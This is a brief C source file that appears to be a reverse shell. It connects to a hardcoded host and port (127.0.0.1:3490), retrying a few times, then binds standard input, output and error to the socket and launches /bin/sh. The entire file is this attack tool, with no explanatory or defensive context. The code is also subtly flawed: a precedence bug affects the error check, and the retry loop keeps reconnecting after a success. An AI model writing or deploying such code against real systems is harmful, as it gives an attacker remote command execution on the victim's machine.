#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

#define PORT "3490"
#define IP "127.0.0.1"
#define TIMEOUT 2


int main(void){
    
    int sockfd;
    struct addrinfo hints, *servinfo, *p;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    
    int status;
    if((status = getaddrinfo(IP, PORT, &hints, &servinfo) != 0)){
        
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return 1;
    }

    for(int i = 0; i < 5; i++){

        for(p = servinfo; p != NULL; p = p->ai_next){
        
            if((sockfd = socket(p->ai_family, 
                            p->ai_socktype, 
                            p->ai_protocol)) == -1){
                
                perror("socket");
                continue; 
            }
            if(connect(sockfd, p->ai_addr, p->ai_addrlen) == -1){
                
                close(sockfd);
                perror("connect");
                continue;
            }

            break;
        }

        if(p == NULL){
            
            fprintf(stderr, "failed to connect to %s:%s\n", IP, PORT);
            if(i==4) return 2;
            sleep(TIMEOUT);
            continue;
        }
    }
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);
}
